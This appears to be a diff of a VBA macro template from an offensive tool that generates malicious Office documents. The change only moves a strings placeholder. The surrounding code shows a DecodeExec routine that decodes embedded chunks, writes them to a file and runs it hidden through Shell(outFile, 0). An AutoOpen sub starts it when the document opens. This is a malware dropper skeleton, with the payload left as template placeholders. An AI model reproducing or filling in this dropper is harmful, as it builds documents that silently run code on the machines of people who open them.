@@ -447,8 +447,6 @@ Private Sub writeBytes(file, bytes)
     binaryStream.SaveToFile file, ForWriting
 End Sub
 
-<<<STRINGS>>>
-
 Private Sub DecodeExec()
     Dim out1 As String
     <<<DECODE_CHUNKS>>>
@@ -462,6 +460,9 @@ Private Sub DecodeExec()
     Dim retVal
     retVal = Shell(outFile, 0)
 End Sub
+
+
+<<<STRINGS>>>
 
 
 Sub AutoOpen()
